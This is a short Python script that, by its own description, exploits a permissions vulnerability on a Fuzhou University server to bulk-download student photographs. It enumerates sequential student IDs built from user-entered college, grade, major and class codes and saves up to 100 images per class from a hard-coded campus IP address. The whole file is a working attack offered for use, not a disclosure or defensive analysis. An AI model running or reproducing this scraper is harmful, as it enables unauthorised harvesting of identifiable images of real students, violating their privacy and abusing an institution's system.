#!/usr/bin/env python3
# -*- coding: utf-8 -*-

'''
this a reptile for student jpg download in Fzu
Just using the permissions vulnerability
'''

import urllib.request
import urllib.error
import os


f = os.path.abspath('.') + '/Date/Photograph'

url_base = 'http://59.77.226.32/xszp/{}/{}'
college = format(int(input('Enter the college which you wish to download?')), '02d')
grade = format(int(input('Enter the grade which you wish to download?')), '02d')
major = format(int(input('Enter the major which you wish to download?')), '02d')
cla = input('Enter the class which you wish to download?')
filename = college + grade + major + cla + '{}.jpg'

f = os.path.join(f, grade)
if not os.path.exists(f):
	os.mkdir(f)
os.chdir(f)

f = os.path.join(f, college+grade+major+'XXX')
if not os.path.exists(f):
	os.mkdir(f)
os.chdir(f)

f = os.path.join(f, college+grade+major+cla+'XX')
if not os.path.exists(f):
	os.mkdir(f)
os.chdir(f)


for x in range(100):
	# if urllib.request.urlopen(url_base.format(grade, filename.format(format(x+1, '02d')))).info()['Content-Type'] != 'image/jpeg':
	# 	break
	urllib.request.urlretrieve(url_base.format(grade, filename.format(format(x+1, '02d'))), filename.format(format(x+1, '02d')))
	

